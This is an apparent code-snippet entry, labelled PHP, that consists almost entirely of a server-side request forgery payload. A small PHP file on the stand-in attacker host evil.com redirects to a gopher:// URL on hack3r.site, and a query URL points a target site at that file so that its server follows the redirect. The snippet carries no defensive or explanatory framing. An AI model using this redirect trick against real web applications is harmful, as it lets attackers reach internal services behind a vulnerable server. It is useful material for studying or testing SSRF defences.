---
id: cfcb6520-ef6c-4dd5-8150-0e82c0b1df41
type: code
language: PHP
verified: false
created_at: '2023-04-06T03:56:37.944134+00:00'
updated_at: '2023-04-10T20:24:09.799895+00:00'
---

# Code Snippet cfcb6520

**Language**: PHP

```php
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
